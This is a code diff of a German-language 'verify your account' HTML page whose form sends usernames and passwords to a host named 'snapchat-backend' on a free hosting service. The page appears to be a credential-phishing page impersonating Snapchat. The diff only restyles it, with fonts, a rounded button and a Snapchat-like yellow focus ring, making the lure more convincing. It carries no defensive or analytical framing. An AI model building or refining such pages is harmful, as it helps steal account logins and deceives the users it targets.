@@ -6,7 +6,7 @@
   <title>Account verifizieren</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Avenir Next', Helvetica, Arial, sans-serif;
       background-color: #f4f4f4;
       display: flex;
       justify-content: center;
@@ -16,41 +16,55 @@
     }
 
     .container {
-      background: white;
-      padding: 2rem;
+      background-color: #fff;
+      padding: 25px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       width: 100%;
-      max-width: 400px;
+      max-width: 360px;
       text-align: center;
     }
 
-    h2 {
-      margin-bottom: 1.5rem;
+    .container h2 {
+      margin-bottom: 20px;
+      color: #16191c;
+      font-size: 22px;
+      font-weight: 600;
     }
 
     input {
-      width: 90%;
-      padding: 0.7rem;
-      margin: 0.5rem 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 1rem;
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 14px;
+      border: none;
+      border-radius: 8px;
+      background-color: #f7f7f7;
+      font-size: 14px;
+      font-weight: 500;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    input:focus {
+      box-shadow: 0 0 0 2px #ffd301;
+      background-color: #f2f2f2;
     }
 
     button {
-      margin-top: 1rem;
-      padding: 0.7rem 1.5rem;
-      font-size: 1rem;
-      background-color: #007bff;
+      width: 100%;
+      padding: 12px;
+      background-color: #0fadff;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 45px;
+      font-size: 14px;
+      font-weight: 600;
       cursor: pointer;
+      transition: background-color 0.3s;
     }
 
     button:hover {
-      background-color: #0056b3;
+      background-color: #0096e5;
     }
   </style>
 </head>
@@ -58,8 +72,8 @@
   <div class="container">
     <h2>🔒 Account verifizieren</h2>
     <form action="https://snapchat-backend-jdiw.onrender.com/submit" method="POST">
-      <input type="text" name="username" placeholder="Benutzername" required><br>
-      <input type="password" name="password" placeholder="Passwort" required><br>
+      <input type="text" name="username" placeholder="Benutzername" required>
+      <input type="password" name="password" placeholder="Passwort" required>
       <button type="submit">Bestätigen</button>
     </form>
   </div>
